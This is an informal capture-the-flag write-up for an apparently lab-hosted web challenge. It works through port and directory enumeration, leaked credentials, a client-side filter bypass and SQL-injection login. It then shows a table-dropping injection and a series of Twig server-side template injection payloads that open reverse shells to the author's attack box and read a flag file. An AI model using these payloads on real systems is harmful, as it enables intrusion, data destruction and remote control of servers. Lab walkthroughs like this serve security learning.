</br> basic scan...
</br>nmap 80 22 -A 10.10.65.186 -v
</br>
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Injectics Leaderboard
MAC Address: 02:58:9A:7A:B5:E1 (Unknown)
```

</br>enumerate dirs in the http port 80 webserver
</br>
</br>`gobuster dir -u http://10.10.166.252:3333 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt`
</br>
![0000DataLEak1](https://github.com/user-attachments/assets/93b25654-4b07-4dcf-b708-815db410ac35)
</br> we get a name and some pathing information from the HTML comments
</br>/flags has more stuff inside of it, but we can't access the folder itsef
</br>![subdireoiwqobwg](https://github.com/user-attachments/assets/c10a0421-863d-4a71-8fe6-ea9168771111)
</br> we must go deeper
</br>`wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt --hw 31 http://10.10.65.186/flags/FUZZ`
</br> what is this admin panel?
![smokeAdminPanel](https://github.com/user-attachments/assets/3de468f1-248a-4502-bdfc-afd657c02fe4)
</br> comment in html talks about mail file?
![maillogFile](https://github.com/user-attachments/assets/747818ad-e79f-40e5-a70b-fe9d4246b2cb)
</br>leaked lead in html about mail.log file
</br>![contentLeak1](https://github.com/user-attachments/assets/570af623-3cd0-4f15-a3e5-f9cf1cd92f3d)

</br>truncated credentials leaked from mail lead:
```
| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |
```
</br> let's inspect this js file
![showmeScript](https://github.com/user-attachments/assets/dd5914e1-2682-4bbc-9f55-ba288c3a8caa)
![sqlStatement1](https://github.com/user-attachments/assets/f7cdd001-3314-404f-8b80-7b22bd315ca8)

</br>I see there is a filter, so I wanna remove the filter to bork it
</br> copy all the js, I'm hilighting it below to COPY
![copyAllScriptToRunOnOwnTerms](https://github.com/user-attachments/assets/d17d5aaf-25b2-4367-b89f-92a4d5f6292d)

</br> right click webpage, go to the Console
</br> paste in ALL the script. Enter. We're running it on our own terms now.

![goToConsoleRemoveFiltersAndRunToLogin](https://github.com/user-attachments/assets/f1ce826a-460b-4b11-9f3b-dbd2da787c11)
</br>  get rid of the filter array (replace with empty arr)
</br> login to email as (with an apostraphie there) -->  `superadmin@injectics.thm' -- -`
</br> 
![loginCapable2132](https://github.com/user-attachments/assets/a7696be4-658f-4f2e-ae0e-32e2b6ed4c36)
</br> mess around with this edit button
![editbtn32r23r](https://github.com/user-attachments/assets/e38283d5-d5d4-415a-bff0-ffbdc663e263)

</br> see if we can inject stuff
![dumbpotatoInject](https://github.com/user-attachments/assets/9a202a7b-317d-4581-9699-5c46e3f30fdc)
</br> alert injection worked
![scriptExecution](https://github.com/user-attachments/assets/3ced3d19-bd21-4238-b241-d1a5dab8175c)
</br> important injection command in e-mail field: `1;drop table users;`
</br> this drops the tables, then resets the users to default credentials, as mentioned in the mail
![dropusers3234](https://github.com/user-attachments/assets/21c26bfc-f56e-4bf0-88db-080b27ee23ce)


</br>admin access passthru (exec disallowed)
</br>{{['id',""]|sort('passthru')}}

</br>{{['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.7.201 1984 >/tmp/f',""]|sort('passthru')}}
</br>10.10.7.201 is my atk box
</br>
</br>running gobuster against /vendor shows there is /bin and /twig
</br>twig is an ssti --> kind of injection vuln if we use a certain syntax
</br>(Server side template injection)
</br>ssti BS syntax, just memorize it
</br>`{{['bash -c "bash -i >& /dev/tcp/10.10.65.186/1984 0>&1"','']|sort('passthru)}}`
</br>
</br>{{['bash -c "bash -i >&/dev/tcp/10.10.2.130/1984 0>&1"','']|sort('passthru')}}
</br>`{{["bash -c 'exec bash -i >&/dev/tcp/10.10.2.130/1984 0>&1' ",""] | sort('passthru') }}`
</br>`{{['busybox nc 10.10.2.130 1984 -e /bin/bash','']|sort('passthru')}}`
</br> literally 3 hours of payload testing later...
</br> `{{ ["bash -c 'exec bash -i >& /dev/tcp/10.10.2.130/1984 0>&1'", ""] | sort('passthru') }}`
</br>goal is to enumerate so screwing around by using injections like
</br> {{['ls- la /directory/name',""]|sort('passthru')}}
</br> helped enumeration
</br> We only want to read from a thing, so though I couldn't get a shell because the environment is Borked, I could still complete the objective and read the target file
</br>
</br> {{['cat /var/www/html/flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt',""]|sort('passthru')}}
